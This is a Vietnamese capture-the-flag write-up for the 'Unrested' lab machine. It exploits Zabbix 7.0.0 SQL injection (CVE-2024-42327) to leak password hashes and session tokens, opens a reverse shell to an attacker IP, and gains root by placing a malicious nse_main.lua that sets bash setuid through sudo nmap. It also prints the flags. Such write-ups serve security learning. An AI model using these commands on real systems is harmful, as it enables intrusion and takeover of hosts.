# Unrested

<img width="1414" height="589" alt="image" src="https://github.com/user-attachments/assets/c142aea6-5570-4d0f-a49a-15215149fa91" />

Tôi dùng nmap để quét các port thì có 4 port:

```
❯ sudo nmap -p- 10.10.11.50
[sudo] password for namdeptrai: 
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-19 12:10 +0700
Nmap scan report for 10.10.11.50 (10.10.11.50)
Host is up (0.037s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
10050/tcp open  zabbix-agent
10051/tcp open  zabbix-trapper

Nmap done: 1 IP address (1 host up) scanned in 20.46 seconds
```

Sau khi đăng nhập bằng cred đề bài cho thì có giao diện như này `matthew / 96qzn0h2e1k3`

<img width="1861" height="945" alt="image" src="https://github.com/user-attachments/assets/7135650a-f6c1-49cd-a710-229a24e8190e" />

Tôi check version thì đây là version 7.0.0 ở cuối trang, search google thì tìm được [CVE-2024-42327](https://www.exploit-db.com/exploits/52230):

<img width="260" height="48" alt="image" src="https://github.com/user-attachments/assets/3b76f0df-d0bc-4d1a-b4b4-7a7a020f1c85" />

Chạy thử đoạn code ở [CVE-2024-42327](https://www.exploit-db.com/exploits/52230) với api `/zabbix/api_jsonrpc.php` thì trả về `[!] VULNERABLE.` chứng tỏ có thể khai thác lỗi ở đây

Tôi search thêm được đoạn exploit nữa là [đây](https://github.com/874anthony/CVE-2024-42327_Zabbix_SQLi/blob/main/sqliZabbix.py), chạy đoạn exploit đó thì ra được như này:

```
/home/namdeptrai/PyCharmMiscProject/.venv/bin/python /home/namdeptrai/PyCharmMiscProject/CVE_2024-42327_exploit.py -u http://10.10.11.50/zabbix/ -U matthew -p 96qzn0h2e1k3 --mode leak-users 
[+] Authenticated successfully. Grabbing the auth token
[+] Found users in the database, leaking them now...
userid: 1, username: Admin, hash: $2y$10$L8UqvYPqu6d7c8NeChnxWe1.w6ycyBERr8UgeUYh.3AO7ps3zer2a, roleid: 3
userid: 2, username: guest, hash: $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06, roleid: 4
userid: 3, username: matthew, hash: $2y$10$e2IsM6YkVvyLX43W5CVhxeA46ChWOUNRzSdIyVzKhRTK00eGq4SwS, roleid: 1
[+] Finished
```

Tôi dùng hashcat với wordlist rockyou.txt thì ra được mật khẩu của `guest` là rỗng, còn lại thì không có ra.

Tiếp tục thì xem token, có token của `userid: 1`:

```
[+] Authenticated successfully. Grabbing the auth token
[+] Found session tokens in the database, leaking them now...
userid: 1, token: 8fd1f3c568448be5e08687cedc2b6ede
userid: 3, token: c503a651e3040d36807643b8984a8518
userid: 3, token: 0ac674dfdd6ee1d1b560bc9cea4a0d7e
userid: 3, token: 8fe49c73e5d1e7dd4105c06c5f44d480
[+] Finished
```

Có token rồi tôi tiếp tục chạy với mode rce:

```
/home/namdeptrai/PyCharmMiscProject/.venv/bin/python /home/namdeptrai/PyCharmMiscProject/CVE_2024-42327_exploit.py -u http://10.10.11.50/zabbix/ -U matthew -p 96qzn0h2e1k3 --mode rce --ip 10.10.14.8 --port 1234 --admin_token 8fd1f3c568448be5e08687cedc2b6ede 
[+] Authenticated successfully. Grabbing the auth token
[+] Open a new terminal and start listening to the port specified
[+] Encountered host_id 10084 and interface_id 1
[+] Finished
```

Đoạn exploit đã trả về reverse shell với user là `zabbix` và có thể đọc được nội dung trong thư mục của user `matthew`:

```
bash-5.1$ whoami
whoami
zabbix
bash-5.1$ cat /home/matthew/user.txt
cat /home/matthew/user.txt
7452cf963a63a840691ea65472474824
bash-5.1$ 
```

Kiểm tra thì thấy được chạy nmap dưới quyền root:

```
bash-5.1$ sudo -l
sudo -l
Matching Defaults entries for zabbix on unrested:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zabbix may run the following commands on unrested:
    (ALL : ALL) NOPASSWD: /usr/bin/nmap *
```

Tôi thử chạy nmap kèm script nhưng không được:

```
bash-5.1$ sudo /usr/bin/nmap --script test.nse example.com
sudo /usr/bin/nmap --script test.nse example.com
Script mode is disabled for security reasons.
```

Để ý trong nmap thì có cờ `--datadir`, tùy chọn này yêu cầu Nmap tìm và tải các file dữ liệu của nó (bao gồm cả các script của Nmap Scripting Engine - NSE) từ thư mục được ghi trong câu lệnh thay vì thư mục mặc định, 
kết hợp với cờ `-sC` tự động chạy các script mặc định, tức là khi khởi động, Nmap sẽ tìm và chạy file `nse_main.lua` trong thư mục dữ liệu của nó

```
bash-5.1$ echo 'os.execute("chmod 4755 /bin/bash")' > nse_main.lua         
echo 'os.execute("chmod 4755 /bin/bash")' > nse_main.lua
bash-5.1$ ls
ls
nse_main.lua
bash-5.1$ sudo /usr/bin/nmap --datadir=/var/lib/zabbix/test -sC localhost
sudo /usr/bin/nmap --datadir=/var/lib/zabbix/test -sC localhost
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-19 05:30 UTC
nmap.original: nse_main.cc:619: int run_main(lua_State*): Assertion `lua_isfunction(L, -1)' failed.
bash: [46340: 2 (255)] tcsetattr: Inappropriate ioctl for device
bash-5.1$ /bin/bash -p
/bin/bash -p
whoami
root
cat /root/root.txt
6a6f6c20c86b4a84c6253db49d83f5da
pwd
/var/lib/zabbix/test
```

Ở đây thì tôi tạo `nse_main.lua` và thêm `os.execute("chmod 4755 /bin/bash")` vào trong file đó nhằm thay đổi quyền trong file `/bin/bash`, chạy nmap với các cờ như đã giải thích ở trên và đã leo được lên root.
